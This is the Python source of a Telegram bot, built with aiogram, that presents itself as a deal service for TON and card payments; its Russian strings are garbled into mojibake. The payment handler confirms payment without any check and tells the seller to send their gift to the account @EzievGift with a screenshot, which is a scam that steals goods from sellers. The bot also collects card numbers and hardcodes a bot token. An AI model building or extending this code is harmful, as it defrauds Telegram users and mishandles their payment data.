from aiogram import Bot, Dispatcher, types
from aiogram.utils import executor

# –¢–≤–æ–π —Ç–æ–∫–µ–Ω
API_TOKEN = "8480844262:AAF5x1hyQCVuF1PeK26sP5lCfhNVISmQ9E8"

bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot)

# –°–ª–æ–≤–∞—Ä—å –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è —Ä–µ–∫–≤–∏–∑–∏—Ç–æ–≤ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π
user_wallets = {}
user_cards = {}

# –°—Ç–∞—Ä—Ç–æ–≤–æ–µ –º–µ–Ω—é
@dp.message_handler(commands=["start"])
async def send_welcome(message: types.Message):
    keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
    keyboard.add("üì® –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ —Ä–µ–∫–≤–∏–∑–∏—Ç–∞–º–∏", "üìÑ –°–æ–∑–¥–∞—Ç—å —Å–¥–µ–ª–∫—É")
    await message.answer("EZIEV üéÅ", reply_markup=keyboard)

# –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ —Ä–µ–∫–≤–∏–∑–∏—Ç–∞–º–∏
@dp.message_handler(lambda msg: msg.text == "üì® –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ —Ä–µ–∫–≤–∏–∑–∏—Ç–∞–º–∏")
async def manage_wallets(message: types.Message):
    keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
    keyboard.add("–î–æ–±–∞–≤–∏—Ç—å / –∏–∑–º–µ–Ω–∏—Ç—å TON-–∫–æ—à–µ–ª—ë–∫", "–î–æ–±–∞–≤–∏—Ç—å / –∏–∑–º–µ–Ω–∏—Ç—å –∫–∞—Ä—Ç—É")
    keyboard.add("‚¨ÖÔ∏è –ù–∞–∑–∞–¥")
    await message.answer("–£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ —Ä–µ–∫–≤–∏–∑–∏—Ç–∞–º–∏:", reply_markup=keyboard)

@dp.message_handler(lambda msg: msg.text == "–î–æ–±–∞–≤–∏—Ç—å / –∏–∑–º–µ–Ω–∏—Ç—å TON-–∫–æ—à–µ–ª—ë–∫")
async def add_wallet(message: types.Message):
    await message.answer("–í–≤–µ–¥–∏—Ç–µ –∞–¥—Ä–µ—Å –≤–∞—à–µ–≥–æ TON-–∫–æ—à–µ–ª—å–∫–∞:")
    dp.register_message_handler(save_wallet, content_types=["text"], state=None)

async def save_wallet(message: types.Message):
    user_wallets[message.from_user.id] = message.text.strip()
    await message.answer("‚úÖ TON-–∫–æ—à–µ–ª—ë–∫ —Å–æ—Ö—Ä–∞–Ω—ë–Ω.")

@dp.message_handler(lambda msg: msg.text == "–î–æ–±–∞–≤–∏—Ç—å / –∏–∑–º–µ–Ω–∏—Ç—å –∫–∞—Ä—Ç—É")
async def add_card(message: types.Message):
    await message.answer("–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä –≤–∞—à–µ–π –∫–∞—Ä—Ç—ã:")
    dp.register_message_handler(save_card, content_types=["text"], state=None)

async def save_card(message: types.Message):
    user_cards[message.from_user.id] = message.text.strip()
    await message.answer("‚úÖ –ö–∞—Ä—Ç–∞ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∞.")

# –°–æ–∑–¥–∞–Ω–∏–µ —Å–¥–µ–ª–∫–∏
@dp.message_handler(lambda msg: msg.text == "üìÑ –°–æ–∑–¥–∞—Ç—å —Å–¥–µ–ª–∫—É")
async def create_deal(message: types.Message):
    keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
    keyboard.add("üíé –ù–∞ TON-–∫–æ—à–µ–ª—ë–∫", "üí≥ –ù–∞ –∫–∞—Ä—Ç—É")
    keyboard.add("‚¨ÖÔ∏è –ù–∞–∑–∞–¥")
    await message.answer("–í—ã–±–µ—Ä–∏—Ç–µ —Å–ø–æ—Å–æ–± –ø–æ–ª—É—á–µ–Ω–∏—è –æ–ø–ª–∞—Ç—ã:", reply_markup=keyboard)

@dp.message_handler(lambda msg: msg.text in ["üíé –ù–∞ TON-–∫–æ—à–µ–ª—ë–∫", "üí≥ –ù–∞ –∫–∞—Ä—Ç—É"])
async def ask_amount(message: types.Message):
    method = message.text
    dp.register_message_handler(lambda m: save_amount(m, method), content_types=["text"], state=None)
    await message.answer("–í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É —Å–¥–µ–ª–∫–∏ –≤ TON:")

async def save_amount(message: types.Message, method):
    amount = message.text.strip()
    await message.answer(f"–£–∫–∞–∂–∏—Ç–µ, —á—Ç–æ –≤—ã –ø—Ä–µ–¥–ª–∞–≥–∞–µ—Ç–µ –≤ —ç—Ç–æ–π —Å–¥–µ–ª–∫–µ –∑–∞ {amount} TON:\n"
                         f"–ü—Ä–∏–º–µ—Ä: 10 –∫–µ–ø–æ–∫ –∏ –ü–µ–ø–µ...")
    dp.register_message_handler(lambda m: save_description(m, method, amount), content_types=["text"], state=None)

async def save_description(message: types.Message, method, amount):
    description = message.text.strip()
    link = f"https://t.me/{(await bot.get_me()).username}?start=deal_{message.from_user.id}"

    await message.answer(
        f"‚úÖ –°–¥–µ–ª–∫–∞ —É—Å–ø–µ—à–Ω–æ —Å–æ–∑–¥–∞–Ω–∞\n\n"
        f"–°—É–º–º–∞: {amount} TON\n"
        f"–í—ã –ø—Ä–µ–¥–ª–∞–≥–∞–µ—Ç–µ: {description}\n"
        f"–°—Å—ã–ª–∫–∞ –¥–ª—è –ø–æ–∫—É–ø–∞—Ç–µ–ª—è: {link}\n"
        f"–ü—Ä–æ–¥–∞–≤–µ—Ü: @{message.from_user.username}\n\n"
        f"–ú—ã —Å–æ–æ–±—â–∏–º –≤–∞–º, –∫–∞–∫ —Ç–æ–ª—å–∫–æ –ø–æ–∫—É–ø–∞—Ç–µ–ª—å –æ–ø–ª–∞—Ç–∏—Ç –ø–æ–¥–∞—Ä–æ–∫."
    )

# –ü–æ–∫—É–ø–∞—Ç–µ–ª—å –æ—Ç–∫—Ä—ã–≤–∞–µ—Ç —Å–¥–µ–ª–∫—É
@dp.message_handler(lambda msg: msg.text.startswith("/start deal_"))
async def buyer_view(message: types.Message):
    seller_id = int(message.text.split("_")[1])
    wallet = user_wallets.get(seller_id, "–Ω–µ —É–∫–∞–∑–∞–Ω")
    card = user_cards.get(seller_id, "–Ω–µ —É–∫–∞–∑–∞–Ω–∞")

    keyboard = types.InlineKeyboardMarkup()
    keyboard.add(types.InlineKeyboardButton("‚úÖ –û–ø–ª–∞—Ç–∏–ª", callback_data=f"paid_{seller_id}"))

    await message.answer(
        f"–í—ã —Å–æ–±–∏—Ä–∞–µ—Ç–µ—Å—å –æ–ø–ª–∞—Ç–∏—Ç—å —Å–¥–µ–ª–∫—É.\n\n"
        f"–†–µ–∫–≤–∏–∑–∏—Ç—ã –ø—Ä–æ–¥–∞–≤—Ü–∞:\n\n"
        f"üíé TON: {wallet}\n"
        f"üí≥ –ö–∞—Ä—Ç–∞: {card}\n",
        reply_markup=keyboard
    )

# –ü–æ–∫—É–ø–∞—Ç–µ–ª—å –Ω–∞–∂–∏–º–∞–µ—Ç "–û–ø–ª–∞—Ç–∏–ª"
@dp.callback_query_handler(lambda call: call.data.startswith("paid_"))
async def payment_done(call: types.CallbackQuery):
    seller_id = int(call.data.split("_")[1])
    await bot.send_message(
        seller_id,
        "–û–ø–ª–∞—Ç–∞ –ø—Ä–æ–∏–∑–≤–µ–¥–µ–Ω–∞ —É—Å–ø–µ—à–Ω–æ ‚úÖ\n\n"
        f"–ß—Ç–æ–±—ã –º—ã –ø–æ–¥—Ç–≤–µ—Ä–¥–∏–ª–∏ –æ–ø–ª–∞—Ç—É, –≤–∞–º –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —Å–≤–æ–π –ø–æ–¥–∞—Ä–æ–∫ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é @EzievGift "
        "–∏ –ø—Ä–∏–∫—Ä–µ–ø–∏—Ç—å —Å–∫—Ä–∏–Ω—à–æ—Ç —Å—é–¥–∞."
    )
    await call.message.answer("–°–ø–∞—Å–∏–±–æ! –í–∞—à –ø—Ä–æ–¥–∞–≤–µ—Ü –±—É–¥–µ—Ç —É–≤–µ–¥–æ–º–ª—ë–Ω. ‚úÖ")

if __name__ == "__main__":
    executor.start_polling(dp, skip_updates=True)
